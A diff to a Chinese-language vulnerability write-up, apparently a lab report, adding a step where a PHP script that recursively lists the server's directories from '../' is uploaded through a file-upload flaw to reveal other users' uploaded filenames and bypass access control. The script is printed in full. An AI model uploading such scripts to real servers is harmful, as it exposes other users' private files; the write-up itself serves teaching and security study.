@@ -154,7 +154,49 @@ php代码执行成功：
 
 ![1660097376206](img/1660097376206.png)
 
-至此漏洞利用成功。
+接下来对漏洞利用具体化，通过上传一个遍历文件夹内文件的可执行文件，获取各用户所上传图片的文件名，从而实现强制访问控制。
+
+编写的可执行程序如下：
+
+```php 
+<?php
+function tree($directory)
+
+{
+
+    $mydir=dir($directory);
+
+    while($file=$mydir->read()){
+
+        if((is_dir("$directory/$file")) AND ($file!=".") AND ($file!=".."))
+
+        {
+
+            echo "$file\n";
+
+            tree("$directory/$file");
+
+    } else
+
+    echo "$file\n";
+
+    }
+
+    echo "\n";
+
+    $mydir->close();
+
+}
+
+tree("../");
+?>
+```
+
+以同样方式上传以后，访问得到：
+
+![1660105192610](img/1660105192610.png)
+
+至此漏洞利用完成。
 
 # 自动化漏洞利用脚本EXP
 
